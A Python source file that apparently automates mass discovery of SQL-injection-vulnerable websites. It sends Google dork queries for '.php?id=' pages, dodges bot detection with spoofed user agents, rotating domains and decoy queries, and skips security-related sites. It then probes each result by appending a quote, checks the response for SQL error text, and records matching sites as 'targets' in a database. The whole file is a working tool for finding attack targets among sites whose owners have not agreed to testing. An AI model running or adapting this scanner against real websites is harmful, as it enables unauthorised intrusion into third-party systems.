#!/usr/bin/env python3

from lib.dbconnection import DatabaseSession
from random import choice, randint
from time import sleep
from sys import exit
import bs4
import requests
import re

class Fuzzer(object):

    def __init__(self):
        self.queries = [
                "inurl%3A+.php%3Fid%3D1",
                "inurl%3A+.php%3Fid%3D2",
                "inurl%3A+.php%3Fid%3D3",
                "inurl%3A+.php%3Fid%3D4",
                "inurl%3A+.php%3Fid%3D5",
                "inurl%3A+.php%3Fid%3D6",
                "inurl%3A+.php%3Fid%3D7",
                "inurl%3A+.php%3Fid%3D8",
                "inurl%3A+.php%3Fid%3D9",
                "inurl%3A+search.php%3Fq%3D"
                ]
        self.filters = [
                'facebook.com',
                'stackoverflow.com',
                'sqlvulnerablewebsites',
                'vulnerable',
                'hacking',
                'sec4sec',
                'cybraryit'
                ]
        self.domains = ['com', 'co.uk', 'ws', 'com.au']
        self.bogus_queries = ['amazon', 'google', 'facebook', 'twitter']
        self.session = DatabaseSession()
        self.websession = requests.Session()
        self.websession.headers.update(
            { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'}
        )
        self.last_domain = None

    def _skip_url(self, url):
        for item in self.filters:
            if item in url:
                return True
        return False

    def _send_bogus_query(self):
        query = choice(self.bogus_queries)
        self._send_query(query)

    def _send_query(self, query):
        suffix = self.last_domain
        pageno = randint(1,10)
        while suffix == self.last_domain:
            suffix = choice(self.domains)
            address= "https://www.google.%s/search?q=%s&start=%s" % (
                        suffix,
                        query,
                        str(pageno*10)
                )
        print("Querying %s: Page %s" % (address, pageno))
        self.last_domain = suffix
        return self.websession.get(address)

    def run_scan(self):
        for query in self.queries:
            results = self.get_endpoints(query)
            for item in results:
                self.test_endpoint(item)
            print("Sending bogus query and sleeping additional 15 seconds")
            self._send_bogus_query()
            sleep(15)
            
    def get_endpoints(self, query):
        results = []
        page = self._send_query(query)
        if re.search('captcha', page.text.lower()):
            print("Detected captcha. We got got. Exiting")
            exit(1)
        else:
            soup = bs4.BeautifulSoup(page.text,"html.parser")
            for item in soup.find_all('h3', attrs={'class' : 'r'}):
                results.append(item.a['href'][7:])
        print("Finished page. Sleeping 15 seconds")
        sleep(15)
        return results

    def test_endpoint(self, item):
        relist = ["sql", "syntax"]
        if not self._skip_url(item):
            url = "%s'" % item.split('&')[0]
            if "http" not in url:
                url = "http://%s" % url
            fixed_url = url.replace('///', '//')
            if not self.session._target_exists_in_db(fixed_url):
                print("Testing %s" % fixed_url)
                try:
                    response = self.websession.get(fixed_url, timeout=5)
                except:
                    print("Yucky URL: %s" % fixed_url)
                    return
                for regex in relist:
                    if re.search(regex, response.text.lower()):
                        print("Potentially vulnerable: %s" % fixed_url)
                        self.session.add_target(fixed_url)
                        return
                    else:
                        continue

